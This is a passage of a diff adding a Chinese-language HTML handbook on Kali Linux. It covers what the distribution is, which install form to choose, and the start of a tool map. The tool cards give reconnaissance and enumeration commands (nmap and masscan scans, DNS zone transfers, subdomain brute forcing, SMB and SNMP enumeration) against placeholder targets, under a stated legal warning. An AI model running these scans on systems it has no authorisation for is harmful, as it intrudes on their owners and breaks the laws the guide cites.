@@ -1,0 +1,2167 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Kali Linux 使用指南 · 工具地图与实操手册</title>
+<meta name="description" content="Kali Linux 是什么、有哪些常用工具、按阶段怎么用、边界在哪。一份可离线阅读的单文件手册。">
+<style>
+:root{
+  --ink:#161a20;
+  --ink-2:#3c444f;
+  --ink-3:#6b7480;
+  --bg:#fbfbf8;
+  --panel:#ffffff;
+  --line:#e2e2da;
+  --line-2:#efefe9;
+  --accent:#2856b8;
+  --accent-2:#0e7a72;
+  --accent-soft:#e9effb;
+  --warn:#8a5210;
+  --warn-soft:#fdf4e4;
+  --danger:#9b2c2c;
+  --danger-soft:#fbeceb;
+  --ok:#1f6b45;
+  --ok-soft:#e8f4ed;
+  --code-bg:#171c25;
+  --code-ink:#dde5ef;
+  --radius:10px;
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Noto Sans SC","Microsoft YaHei",sans-serif;
+}
+*{box-sizing:border-box}
+[hidden]{display:none !important}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  margin:0;background:var(--bg);color:var(--ink);
+  font-family:var(--sans);font-size:16px;line-height:1.7;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:var(--accent);text-decoration-thickness:1px;text-underline-offset:2px}
+a:hover{text-decoration-style:dotted}
+a:focus-visible,button:focus-visible,summary:focus-visible,input:focus-visible{
+  outline:2px solid var(--accent);outline-offset:2px;border-radius:4px;
+}
+.skip{position:absolute;left:-9999px;top:0;background:var(--ink);color:#fff;padding:10px 16px;z-index:99;border-radius:0 0 8px 0}
+.skip:focus{left:0}
+.wrap{max-width:1180px;margin:0 auto;padding:0 24px}
+code{font-family:var(--mono);font-size:.9em}
+
+/* ---------- hero ---------- */
+.hero{
+  background:
+    radial-gradient(900px 340px at 8% -20%, #22406e 0%, rgba(34,64,110,0) 70%),
+    radial-gradient(800px 320px at 92% -30%, #14494d 0%, rgba(20,73,77,0) 72%),
+    #11161f;
+  color:#eef2f8;
+  border-bottom:1px solid #0b0f15;
+}
+.hero .wrap{padding-top:54px;padding-bottom:38px}
+.eyebrow{
+  font-family:var(--mono);font-size:12px;letter-spacing:.16em;text-transform:uppercase;
+  color:#7fb2ff;margin:0 0 16px;
+}
+h1{
+  font-size:clamp(28px,4.6vw,48px);line-height:1.16;margin:0 0 14px;
+  letter-spacing:-.018em;font-weight:750;color:#fff;
+}
+.lede{font-size:clamp(15px,1.6vw,18px);color:#b9c5d4;max-width:62ch;margin:0 0 26px}
+.lede strong{color:#fff;font-weight:600}
+.hero-facts{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));
+  gap:1px;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.12);
+  border-radius:var(--radius);overflow:hidden;margin:0 0 30px;
+}
+.hero-facts div{background:#141a24;padding:14px 16px}
+.hero-facts dt{font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:#8fa0b6;margin:0 0 4px;font-family:var(--mono)}
+.hero-facts dd{margin:0;font-size:14px;color:#e8eef6;font-weight:600}
+.legal-strip{
+  border:1px solid rgba(255,190,120,.32);background:rgba(255,190,120,.09);
+  border-radius:var(--radius);padding:14px 16px;font-size:13.5px;color:#f0dcc0;line-height:1.6;
+}
+.legal-strip b{color:#ffd9a6}
+
+/* ---------- nav ---------- */
+.toc{
+  position:sticky;top:0;z-index:20;background:rgba(251,251,248,.94);
+  backdrop-filter:saturate(1.2) blur(8px);border-bottom:1px solid var(--line);
+}
+.toc .wrap{display:flex;gap:2px;overflow-x:auto;padding:0 24px;scrollbar-width:none}
+.toc .wrap::-webkit-scrollbar{display:none}
+.toc a{
+  flex:0 0 auto;padding:13px 12px;font-size:13.5px;color:var(--ink-2);text-decoration:none;
+  border-bottom:2px solid transparent;white-space:nowrap;
+}
+.toc a:hover{color:var(--accent);border-bottom-color:var(--line)}
+.toc a .n{font-family:var(--mono);font-size:11px;color:var(--ink-3);margin-right:5px}
+
+/* ---------- sections ---------- */
+main{padding-bottom:20px}
+section{padding:52px 0 8px;border-top:1px solid var(--line-2);scroll-margin-top:62px}
+section:first-of-type{border-top:0}
+h2{
+  font-size:clamp(22px,2.6vw,30px);line-height:1.28;margin:0 0 14px;
+  letter-spacing:-.012em;font-weight:720;
+}
+h2 .num{
+  display:block;font-family:var(--mono);font-size:11.5px;letter-spacing:.15em;
+  color:var(--accent-2);font-weight:600;margin-bottom:8px;
+}
+h3{font-size:17px;margin:30px 0 10px;letter-spacing:-.005em}
+h4{font-size:15px;margin:22px 0 8px}
+p{margin:0 0 14px}
+.sub{font-size:15.5px;color:var(--ink-2);max-width:74ch}
+.sub em{font-style:normal;background:linear-gradient(transparent 62%, #ffe8a8 62%);padding:0 1px}
+
+/* ---------- prose layout ---------- */
+.cols2{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:26px;margin:22px 0}
+.cols2 > *{min-width:0}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:20px 22px}
+.panel h3{margin-top:0}
+.panel.warn{background:var(--warn-soft);border-color:#f0dfc2}
+.panel.bad{background:var(--danger-soft);border-color:#f2d4d1}
+.panel.good{background:var(--ok-soft);border-color:#cfe6d9}
+.panel p:last-child,.panel ul:last-child{margin-bottom:0}
+ul,ol{margin:0 0 14px;padding-left:20px}
+li{margin:5px 0}
+li::marker{color:var(--ink-3)}
+.muted{color:var(--ink-3)}
+.tag{
+  display:inline-block;font-family:var(--mono);font-size:11px;line-height:1.5;
+  padding:1px 7px;border-radius:999px;background:var(--accent-soft);color:var(--accent);
+  border:1px solid #d5e0f6;white-space:nowrap;
+}
+.tag.g{background:var(--ok-soft);color:var(--ok);border-color:#cfe6d9}
+.tag.w{background:var(--warn-soft);color:var(--warn);border-color:#f0dfc2}
+.tag.r{background:var(--danger-soft);color:var(--danger);border-color:#f2d4d1}
+
+/* ---------- table ---------- */
+.tbl-wrap{overflow-x:auto;margin:18px 0;border:1px solid var(--line);border-radius:var(--radius);background:var(--panel)}
+table{border-collapse:collapse;width:100%;font-size:14.5px;min-width:620px}
+th,td{text-align:left;padding:11px 14px;border-bottom:1px solid var(--line-2);vertical-align:top}
+th{background:#f6f6f1;font-size:12.5px;letter-spacing:.04em;text-transform:uppercase;color:var(--ink-3);font-weight:600;white-space:nowrap}
+tbody tr:last-child td{border-bottom:0}
+td:first-child{white-space:nowrap;font-weight:600}
+table code{background:#f2f3ee;padding:1px 5px;border-radius:4px}
+
+/* ---------- controls / cards ---------- */
+.controls{margin:22px 0 18px;display:grid;gap:12px}
+.search{display:flex;align-items:center;gap:10px;background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:9px 12px}
+.search input{
+  flex:1;border:0;background:transparent;font-size:15px;color:var(--ink);
+  font-family:var(--sans);padding:3px 0;min-width:0;
+}
+.chips{display:flex;flex-wrap:wrap;gap:7px}
+.chip{
+  font:inherit;font-size:13px;padding:5px 12px;border-radius:999px;cursor:pointer;
+  background:var(--panel);border:1px solid var(--line);color:var(--ink-2);
+}
+.chip:hover{border-color:#c9cdd4;color:var(--ink)}
+.chip[aria-pressed="true"]{background:var(--ink);color:#fff;border-color:var(--ink)}
+.chip .c{font-family:var(--mono);font-size:11px;opacity:.65;margin-left:4px}
+.count{margin:0;font-size:13px;color:var(--ink-3);font-family:var(--mono)}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(330px,1fr));gap:14px;margin-top:16px}
+.card{
+  background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);
+  padding:16px 17px;display:flex;flex-direction:column;gap:8px;
+}
+.card-h{display:flex;align-items:baseline;justify-content:space-between;gap:10px}
+.card-h h3{margin:0;font-size:16px;font-family:var(--mono);font-weight:650;letter-spacing:-.01em;word-break:break-word}
+.card .desc{margin:0;font-size:14px;color:var(--ink-2);line-height:1.6}
+.card pre{margin:0;padding-right:52px}
+.card pre code{white-space:pre-wrap;word-break:break-word}
+.card .note{margin:0;font-size:12.5px;color:var(--ink-3);line-height:1.55;border-top:1px dashed var(--line);padding-top:8px}
+.card .note b{color:var(--warn);font-weight:600}
+.empty{font-size:14px;color:var(--ink-3);padding:18px 0}
+
+/* ---------- code ---------- */
+pre{
+  background:var(--code-bg);color:var(--code-ink);border-radius:8px;
+  padding:13px 15px;overflow-x:auto;font-size:13px;line-height:1.62;margin:0 0 14px;
+  font-family:var(--mono);tab-size:2;
+}
+pre code{font-size:inherit}
+pre .c{color:#7d8b9c}      /* 注释 */
+pre .p{color:#8fd0ff}      /* 提示符 / 强调 */
+pre .k{color:#ffc98b}      /* 关键字 */
+pre .s{color:#a8e0b4}      /* 字符串 */
+.codewrap{position:relative;margin:0 0 14px}
+.codewrap pre{margin:0}
+.copy{
+  position:absolute;top:8px;right:8px;font:inherit;font-size:11.5px;font-family:var(--mono);
+  padding:3px 9px;border-radius:6px;cursor:pointer;
+  background:rgba(255,255,255,.09);color:#c8d4e2;border:1px solid rgba(255,255,255,.14);
+  opacity:.6;transition:opacity .15s;
+}
+.codewrap:hover .copy,.copy:focus-visible{opacity:1}
+.copy:focus-visible{outline-color:#8fb6ff}
+
+/* ---------- steps / timeline ---------- */
+.flow{display:grid;gap:10px;margin:22px 0}
+.step{
+  display:grid;grid-template-columns:64px 1fr;gap:16px;align-items:start;
+  background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:16px 18px;
+}
+.step .no{
+  font-family:var(--mono);font-size:12px;color:#fff;background:var(--accent);
+  width:34px;height:34px;border-radius:50%;display:grid;place-items:center;font-weight:600;
+}
+.step:nth-child(2) .no{background:#2a6a9c}
+.step:nth-child(3) .no{background:#2b7d74}
+.step:nth-child(4) .no{background:#7a6524}
+.step:nth-child(5) .no{background:#7c4b3a}
+.step:nth-child(6) .no{background:#5b4a7a}
+.step h4{margin:0 0 4px;font-size:15.5px}
+.step p{margin:0 0 6px;font-size:14px;color:var(--ink-2)}
+.step .tools{font-family:var(--mono);font-size:12.5px;color:var(--accent-2);word-break:break-word}
+.step .out{font-size:12.5px;color:var(--ink-3);margin-top:6px}
+
+/* ---------- cheatsheet ---------- */
+.cheat{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:4px 20px 18px;margin:16px 0}
+.cheat h3{font-size:15px;margin:18px 0 8px;font-family:var(--mono)}
+.cheat pre{font-size:12.5px;padding-right:58px}
+
+/* ---------- tabs ---------- */
+.tabs{display:flex;gap:6px;flex-wrap:wrap;border-bottom:1px solid var(--line);margin:20px 0 0}
+.tab{
+  font:inherit;font-size:13.5px;padding:8px 14px;background:transparent;border:1px solid transparent;
+  border-bottom:2px solid transparent;color:var(--ink-3);cursor:pointer;border-radius:6px 6px 0 0;
+}
+.tab[aria-selected="true"]{color:var(--ink);background:var(--panel);border-color:var(--line);border-bottom-color:var(--panel);margin-bottom:-1px;font-weight:600}
+.tabpanel{background:var(--panel);border:1px solid var(--line);border-top:0;border-radius:0 0 var(--radius) var(--radius);padding:20px 22px}
+.tabpanel[hidden]{display:none}
+.tabpanel > :first-child{margin-top:0}
+
+/* ---------- details / links ---------- */
+details{border:1px solid var(--line);border-radius:var(--radius);background:var(--panel);padding:0 18px;margin:10px 0}
+details[open]{padding-bottom:6px}
+summary{cursor:pointer;padding:14px 0;font-weight:600;font-size:15px;list-style:none;display:flex;gap:10px;align-items:baseline}
+summary::-webkit-details-marker{display:none}
+summary::before{content:"+";font-family:var(--mono);color:var(--accent);font-size:16px;line-height:1}
+details[open] summary::before{content:"–"}
+details p,details ul{font-size:14.5px;color:var(--ink-2)}
+details p:last-child,details ul:last-child{margin-bottom:10px}
+.links{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px;margin:18px 0}
+.links div{border:1px solid var(--line);border-radius:8px;padding:11px 14px;background:var(--panel);font-size:13.5px}
+.links b{display:block;font-size:14px;margin-bottom:2px}
+.links a{word-break:break-all;font-size:12.5px;color:var(--ink-3);text-decoration:none}
+.links a:hover{color:var(--accent);text-decoration:underline}
+
+footer{border-top:1px solid var(--line);margin-top:40px;padding:24px 0 40px;font-size:12.5px;color:var(--ink-3)}
+footer .wrap{display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+
+@media (max-width:720px){
+  .cols2{grid-template-columns:minmax(0,1fr)}
+  .grid{grid-template-columns:1fr}
+  .step{grid-template-columns:44px 1fr;gap:12px}
+  .hero .wrap{padding-top:38px}
+  .copy{opacity:1}
+  section{padding-top:38px}
+}
+@media print{
+  .toc,.copy,.hero-facts{display:none}
+  body{background:#fff}
+  pre{white-space:pre-wrap;word-break:break-word}
+}
+</style>
+</head>
+<body>
+<a class="skip" href="#main">跳到正文</a>
+
+<header class="hero">
+  <div class="wrap">
+    <p class="eyebrow">Kali Linux · Field Guide</p>
+    <h1>Kali 不是一把万能钥匙，<br>它是一个装好的工具箱</h1>
+    <p class="lede">
+      这份手册回答三个问题：<strong>Kali 里到底装了什么</strong>、这些工具<strong>按什么顺序用</strong>、
+      以及<strong>哪些事不能做</strong>。工具清单覆盖侦察到报告十四个类别，一百多个常用条目，
+      每条都给出典型命令和它最容易踩的坑。
+    </p>
+    <dl class="hero-facts">
+      <div><dt>Base</dt><dd>Debian · 滚动更新</dd></div>
+      <div><dt>Maintainer</dt><dd>Offensive Security</dd></div>
+      <div><dt>Tools</dt><dd>仓库内 600+ 项</dd></div>
+      <div><dt>Desktop</dt><dd>默认 XFCE，可换 GNOME/KDE</dd></div>
+      <div><dt>Login</dt><dd>默认普通用户 + sudo</dd></div>
+    </dl>
+    <p class="legal-strip">
+      <b>先读这一句：</b>Kali 里的工具本身合法，用它们去碰别人的系统就是另一回事。
+      中国《刑法》第 285、286 条与《网络安全法》第 27 条都管这件事——<b>没有书面授权，扫描也算越界</b>。
+      本手册所有命令只用于你自己的实验环境和明确授权的目标。
+    </p>
+  </div>
+</header>
+
+<nav class="toc" aria-label="章节导航">
+  <div class="wrap">
+    <a href="#what"><span class="n">01</span>它是什么</a>
+    <a href="#form"><span class="n">02</span>装哪种</a>
+    <a href="#tools"><span class="n">03</span>工具地图</a>
+    <a href="#flow"><span class="n">04</span>测试流程</a>
+    <a href="#cheat"><span class="n">05</span>命令速查</a>
+    <a href="#pkg"><span class="n">06</span>元包与维护</a>
+    <a href="#legal"><span class="n">07</span>法律边界</a>
+    <a href="#learn"><span class="n">08</span>学习路线</a>
+    <a href="#pitfalls"><span class="n">09</span>常见坑</a>
+    <a href="#links"><span class="n">10</span>资源</a>
+  </div>
+</nav>
+
+<main id="main">
+<div class="wrap">
+
+<!-- ============ 01 ============ -->
+<section id="what">
+  <h2><span class="num">01 / WHAT IT IS</span>先拆掉四个误会</h2>
+  <p class="sub">
+    Kali 的定位被营销图和短视频带偏了很久。它本质上就是 <em>Debian 加一批预装软件、一套驱动补丁和几个元包</em>，
+    没有任何"渗透魔法"。四个最常见的误会，会直接决定你用它的方式对不对。
+  </p>
+
+  <div class="cols2">
+    <div class="panel bad">
+      <h3>「装了 Kali 就会渗透」</h3>
+      <p>
+        工具解决的是"执行"，不解决"判断"。同一台机器，会的人看到 8080 端口会去查 Tomcat 的默认口令和 Manager 应用；
+        不会的人只会把 nmap 的输出截图发到群里。Kali 让执行成本接近零，判断成本一点没降。
+      </p>
+    </div>
+    <div class="panel bad">
+      <h3>「Kali 自带匿名」</h3>
+      <p>
+        默认情况下你的出口 IP 就是自己家的宽带 IP。Tor、VPN、代理链都要自己配，而且它们只改网络层，
+        不改浏览器指纹、不改时区、不改日志。匿名的核心是操作纪律，不是一个发行版的名字。
+      </p>
+    </div>
+    <div class="panel warn">
+      <h3>「Kali 可以当日常系统」</h3>
+      <p>
+        技术上可以，实践上不建议：滚动更新偶尔把驱动或桌面搞挂；几百个工具抢同一批依赖；
+        它默认不做面向日常使用的加固。日常用 Debian/Ubuntu，把 Kali 放虚拟机里，是更省心的组合。
+      </p>
+    </div>
+    <div class="panel warn">
+      <h3>「Kali 只给攻击者用」</h3>
+      <p>
+        取证、日志分析、应急响应、合规检查用的也是同一批工具（Sleuth Kit、Volatility、Zeek、Suricata）。
+        官方还单独出了偏防守的 Kali Purple。攻击和防守在工具层面高度重合，区别在授权和目标。
+      </p>
+    </div>
+  </div>
+
+  <h3>它自带的东西，分三层看</h3>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>层</th><th>内容</th><th>你实际会用到多少</th></tr></thead>
+      <tbody>
+        <tr><td>系统层</td><td>Debian testing 血统的 kali-rolling、XFCE 桌面、NetworkManager、Metasploit 用的 PostgreSQL、自带补丁的内核（注入类无线网卡驱动支持更好）</td><td>天天用，但要自己配时区、输入法、快照</td></tr>
+        <tr><td>元包层</td><td><code>kali-linux-default</code> 等元包，按类别拉取 <code>kali-tools-*</code>，一个命令装一类</td><td>决定你的工具是 200 个还是 600 个</td></tr>
+        <tr><td>工具层</td><td>600+ 个包：nmap、Burp、Metasploit、hashcat、Wireshark、Volatility、Ghidra……</td><td>真正高频的不到 30 个，见下一节</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <p class="muted" style="font-size:13.5px">
+    版本节奏：Kali 是滚动发行，没有"年度大版本"，只有季度镜像刷新。所以网上教程里的版本号大多不重要，
+    但"某工具被改名/被移除"很常见——遇到命令不存在，先 <code>apt search</code> 而不是怀疑自己。
+  </p>
+</section>
+
+<!-- ============ 02 ============ -->
+<section id="form">
+  <h2><span class="num">02 / WHICH BUILD</span>先选形态，再谈工具</h2>
+  <p class="sub">
+    同一套工具，装在不同形态里能做的事差别很大。选错的典型症状：在 WSL 里折腾无线网卡、在虚拟机里跑 GPU 破解、
+    在实体机上滚更新滚到没网。
+  </p>
+
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>形态</th><th>适合</th><th>代价 / 限制</th></tr></thead>
+      <tbody>
+        <tr><td>虚拟机镜像<br><span class="muted" style="font-weight:400;font-size:12.5px">VMware / VirtualBox / Hyper-V</span></td><td>入门首选。快照一秒回滚，环境隔离，宿主机照常办公</td><td>无 GPU 直通时 hashcat 很慢；无线网卡只能 USB 直通且型号挑剔；桥接网络要手动配</td></tr>
+        <tr><td>Installer ISO<br><span class="muted" style="font-weight:400;font-size:12.5px">实体机 / 双系统</span></td><td>需要真实硬件：无线注入、蓝牙、RFID、SDR、性能敏感任务</td><td>分区有风险，装前备份；滚动更新可能影响日常使用；建议单独一块盘</td></tr>
+        <tr><td>Live USB</td><td>临时借用机器、应急排查、不想留痕的演示</td><td>默认不持久化（要手动加 persistence 分区）；U 盘速度拖慢体验</td></tr>
+        <tr><td>WSL2</td><td>Windows 上快速用 CLI 工具：nmap、sqlmap、ffuf、impacket</td><td>没有 GUI 工具（Burp/Wireshark 需另配 WSLg）；无无线；raw socket 行为受限，扫描结果可能和真机不同</td></tr>
+        <tr><td>ARM 镜像</td><td>树莓派、随身设备、低功耗跳板</td><td>部分工具无 ARM 包；性能有限；散热</td></tr>
+        <tr><td>Kali NetHunter</td><td>安卓手机做 HID 键盘注入、外接网卡无线测试</td><td>需要 root 与定制内核，机型支持有限；日常手机不建议</td></tr>
+        <tr><td>Docker 镜像</td><td>CI 里跑扫描、批量任务、把工具固定成版本</td><td>要自己处理网络与权限（<code>--net host</code>、<code>--privileged</code>），不适合当交互式工作站</td></tr>
+        <tr><td>Kali Purple</td><td>蓝队 / SOC 实验：Suricata、Zeek、Arkime、Wazuh、TheHive 等一套防守栈</td><td>占用资源大；组件随版本调整，装完先看官方文档；不是"防守版 Metasploit"</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="panel good">
+    <h3 style="margin-top:0">给第一次装的人一条最短路径</h3>
+    <ol style="margin-bottom:0">
+      <li>下载 <b>VirtualBox / VMware 预构建镜像</b>（kali.org/get-kali 的 Virtual Machines 页），导入即用。</li>
+      <li>登录：用户名 <code>kali</code>、密码 <code>kali</code>（仅预构建镜像如此；安装版是你自己设的）。</li>
+      <li>第一件事：<code>sudo apt update &amp;&amp; sudo apt full-upgrade -y</code>，然后做快照，命名"干净基线"。</li>
+      <li>网络先用 NAT，需要被局域网访问时再加一块 Host-only / 桥接网卡。</li>
+      <li>拍完快照再折腾驱动和工具，坏了直接回滚，别硬修。</li>
+    </ol>
+  </div>
+</section>
+
+<!-- ============ 03 ============ -->
+<section id="tools">
+  <h2><span class="num">03 / TOOL MAP</span>十四类，一百多个工具，按用途查</h2>
+  <p class="sub">
+    下面按 Kali 官方工具分类（<code>kali-tools-*</code> 元包）排列，每张卡给一句话定位、一条典型命令、一个最常踩的坑。
+    命令里的 IP、域名、哈希都是占位符。搜索框可以直接搜"无线""提权""哈希""取证"这类中文。
+  </p>
+
+  <div class="controls">
+    <label class="search">
+      <span aria-hidden="true" style="font-size:13px;color:var(--ink-3)">检索</span>
+      <input id="q" type="search" placeholder="名称 / 用途 / 关键词，例如：无线、哈希、提权、取证" aria-label="按名称或关键词筛选工具">
+    </label>
+    <div class="chips" role="group" aria-label="按类别筛选">
+      <button class="chip" type="button" data-cat="all" aria-pressed="true">全部</button>
+      <button class="chip" type="button" data-cat="recon" aria-pressed="false">信息收集</button>
+      <button class="chip" type="button" data-cat="web" aria-pressed="false">Web 应用</button>
+      <button class="chip" type="button" data-cat="vuln" aria-pressed="false">漏洞分析</button>
+      <button class="chip" type="button" data-cat="pass" aria-pressed="false">密码</button>
+      <button class="chip" type="button" data-cat="exploit" aria-pressed="false">利用</button>
+      <button class="chip" type="button" data-cat="mitm" aria-pressed="false">嗅探/中间人</button>
+      <button class="chip" type="button" data-cat="post" aria-pressed="false">后渗透</button>
+      <button class="chip" type="button" data-cat="wireless" aria-pressed="false">无线</button>
+      <button class="chip" type="button" data-cat="hw" aria-pressed="false">硬件/射频</button>
+      <button class="chip" type="button" data-cat="forensic" aria-pressed="false">取证</button>
+      <button class="chip" type="button" data-cat="rev" aria-pressed="false">逆向</button>
+      <button class="chip" type="button" data-cat="report" aria-pressed="false">报告</button>
+      <button class="chip" type="button" data-cat="defense" aria-pressed="false">防守</button>
+    </div>
+    <p class="count" id="count" aria-live="polite">正在载入清单…</p>
+  </div>
+
+  <div class="grid" id="cards">
+
+    <!-- ===== 信息收集 ===== -->
+    <article class="card" data-cat="recon">
+      <div class="card-h"><h3>nmap</h3><span class="tag">信息收集</span></div>
+      <p class="desc">端口与服务识别的事实标准。脚本引擎（NSE）让它从"扫端口"扩展到漏洞探测、服务枚举、认证爆破。</p>
+<pre><code>sudo nmap -sS -sV -O -p- -T4 --min-rate 1000 10.10.10.5</code></pre>
+      <p class="note"><b>坑：</b><code>-sS</code> 要 root；<code>-p-</code> 扫全端口对内网设备很慢，先跑 <code>--top-ports 1000</code>。结果一定存盘：<code>-oA scan/10.10.10.5</code>。</p>
+    </article>
+
+    <article class="card" data-cat="recon">
+      <div class="card-h"><h3>masscan</h3><span class="tag">信息收集</span></div>
+      <p class="desc">异步发包，扫描整个网段只花几分钟。适合先圈出"哪些 IP 活着、开了哪些端口"，再交给 nmap 细看。</p>
+<pre><code>sudo masscan -p1-65535 10.10.10.0/24 --rate=1000 -oL mass.txt</code></pre>
+      <p class="note"><b>坑：</b>速率调高会把小路由器打趴下，也会被 IDS 一眼看到。先用 <code>--rate=100</code> 试。</p>
+    </article>
+
+    <article class="card" data-cat="recon">
+      <div class="card-h"><h3>whois / dig</h3><span class="tag">信息收集</span></div>
+      <p class="desc">域名注册信息与 DNS 记录。资产梳理的第一步：注册人、NS、MX、TXT 里经常藏着内部系统名。</p>
+<pre><code>whois example.com
+dig +short MX example.com
+dig axfr @ns1.example.com example.com</code></pre>
+      <p class="note"><b>坑：</b>AXFR 区域传送绝大多数域名已禁止；被拒绝是常态，不是命令写错。</p>
+    </article>
+
+    <article class="card" data-cat="recon">
+      <div class="card-h"><h3>dnsrecon</h3><span class="tag">信息收集</span></div>
+      <p class="desc">DNS 枚举一体化：A/NS/MX/SRV 记录、区域传送、子域名爆破、反向解析、缓存嗅探。</p>
+<pre><code>dnsrecon -d example.com -t std
+dnsrecon -d example.com -t brt -D subdomains.txt</code></pre>
+      <p class="note"><b>坑：</b>爆破模板在 <code>/usr/share/dnsrecon/</code>，默认字典很小，效果取决于你给的字典。</p>
+    </article>
+
+    <article class="card" data-cat="recon">
+      <div class="card-h"><h3>dnsenum</h3><span class="tag">信息收集</span></div>
+      <p class="desc">老牌 DNS 枚举脚本，会把 Google 抓取、区域传送、子域爆破、WHOIS 网段查询串成一个流程。</p>
+<pre><code>dnsenum example.com</code></pre>
+      <p class="note"><b>坑：</b>内置 Google 抓取接口早已失效，输出里那一段空的是正常的，别当成"没有子域"。</p>
+    </article>
+
+    <article class="card" data-cat="recon">
+      <div class="card-h"><h3>fierce</h3><span class="tag">信息收集</span></div>
+      <p class="desc">轻量级 DNS 侦察，先找 NS 再尝试区域传送，最后做子域暴力枚举，输出比较干净。</p>
+<pre><code>fierce --domain example.com</code></pre>
+      <p class="note"><b>坑：</b>对 CDN 后面的域名几乎无效，解析出来全是一个 IP。</p>
+    </article>
+
+    <article class="card" data-cat="recon">
+      <div class="card-h"><h3>theHarvester</h3><span class="tag">信息收集</span></div>
+      <p class="desc">从公开搜索引擎和证书透明度日志里捞邮箱、子域、主机名、员工名，用于社会工程前的信息面测绘。</p>
+<pre><code>theHarvester -d example.com -b duckduckgo,bing,crtsh -l 300</code></pre>
+      <p class="note"><b>坑：</b>不同 <code>-b</code> 源需要不同 API key，没配就直接跳过；结果噪声大，要人工去重。</p>
+    </article>
+
+    <article class="card" data-cat="recon">
+      <div class="card-h"><h3>recon-ng</h3><span class="tag">信息收集</span></div>
+      <p class="desc">模块化的侦察框架，用"工作区 + 模块 + 数据库"管理整个 OSINT 流程，结果可以导出成表。</p>
+<pre><code>recon-ng
+&gt; marketplace search
+&gt; workspaces create acme
+&gt; modules load recon/domains-hosts/hackertarget
+&gt; run</code></pre>
+      <p class="note"><b>坑：</b>模块市场里的接口大多要 key；先把 <code>keys add</code> 配好，否则一堆模块跑不出东西。</p>
+    </article>
+
+    <article class="card" data-cat="recon">
+      <div class="card-h"><h3>amass</h3><span class="tag">信息收集</span></div>
+      <p class="desc">OWASP 出品，做子域枚举和资产图谱，被动源和主动爆破都支持，适合较大范围的资产盘点。</p>
+<pre><code>amass enum -passive -d example.com -o subs.txt</code></pre>
+      <p class="note"><b>坑：</b>主动模式很吵、很吃资源；先 passive，再对候选子域用 httpx 验证存活。</p>
+    </article>
+
+    <article class="card" data-cat="recon">
+      <div class="card-h"><h3>netdiscover</h3><span class="tag">信息收集</span></div>
+      <p class="desc">ARP 层面的主机发现，不依赖 ICMP，能找出关了 ping 的设备。进内网后第一件事常是它。</p>
+<pre><code>sudo netdiscover -r 192.168.56.0/24</code></pre>
+      <p class="note"><b>坑：</b>只能发现同一二层网段的设备，跨网段无效；虚拟机 NAT 模式下看到的是虚拟网段。</p>
+    </article>
+
+    <article class="card" data-cat="recon">
+      <div class="card-h"><h3>arp-scan</h3><span class="tag">信息收集</span></div>
+      <p class="desc">比 netdiscover 更快更干净的 ARP 扫描器，能顺带识别网卡厂商（OUI），快速判断设备类型。</p>
+<pre><code>sudo arp-scan -l --interface=eth0</code></pre>
+      <p class="note"><b>坑：</b>需要和目标准备在同一广播域；容器/虚拟网桥里常拿到错误的 MAC。</p>
+    </article>
+
+    <article class="card" data-cat="recon">
+      <div class="card-h"><h3>enum4linux / enum4linux-ng</h3><span class="tag">信息收集</span></div>
+      <p class="desc">把 SMB/RPC 的一堆手工查询打包成一个命令：用户、组、共享、密码策略、操作系统信息全试一遍。</p>
+<pre><code>enum4linux-ng -A 10.10.10.5</code></pre>
+      <p class="note"><b>坑：</b>扫描噪声大、连接数多，容易被锁定或封 IP；先用 <code>-u '' -p ''</code> 试匿名。</p>
+    </article>
+
+    <article class="card" data-cat="recon">
+      <div class="card-h"><h3>smbmap / smbclient</h3><span class="tag">信息收集</span></div>
+      <p class="desc">枚举 SMB 共享、权限和可写目录。拿到凭据后，这是横向移动最常用的入口之一。</p>
+<pre><code>smbmap -H 10.10.10.5 -u user -p 'pass'
+smbclient -L //10.10.10.5 -N</code></pre>
+      <p class="note"><b>坑：</b>能列共享不等于能读文件；<code>smbmap -R</code> 递归列目录会非常慢。</p>
+    </article>
+
+    <article class="card" data-cat="recon">
+      <div class="card-h"><h3>snmpwalk</h3><span class="tag">信息收集</span></div>
+      <p class="desc">SNMP 默认团体名（public/private）经常没改，一次 walk 能拿到接口表、路由、进程、安装软件甚至用户名。</p>
+<pre><code>snmpwalk -v2c -c public 10.10.10.5</code></pre>
+      <p class="note"><b>坑：</b>UDP 161 不通时先确认不是防火墙丢包；输出可达数千行，务必重定向到文件再 grep。</p>
+    </article>
+
+    <!-- ===== Web 应用 ===== -->
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>Burp Suite</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">Web 测试的主工作台：代理拦包、Repeater 重放、Intruder 爆破、Scanner（Pro）自动扫。Kali 预装社区版。</p>
+<pre><code>burpsuite &amp;
+# 浏览器代理指向 127.0.0.1:8080，访问 http://burp 下载 CA 证书</code></pre>
+      <p class="note"><b>坑：</b>不装 CA 证书就看不到 HTTPS 明文；社区版 Intruder 限速，暴力破解很慢。</p>
+    </article>
+
+    <article class="card" data-cat="web">
+      <div class="card-h"><h3>OWASP ZAP</h3><span class="tag">Web 应用</span></div>
+      <p class="desc">开源替代 Burp 的完整方案，自动扫描和被动扫描都强，命令行/CI 集成比 Burp 免费版友好。</p>
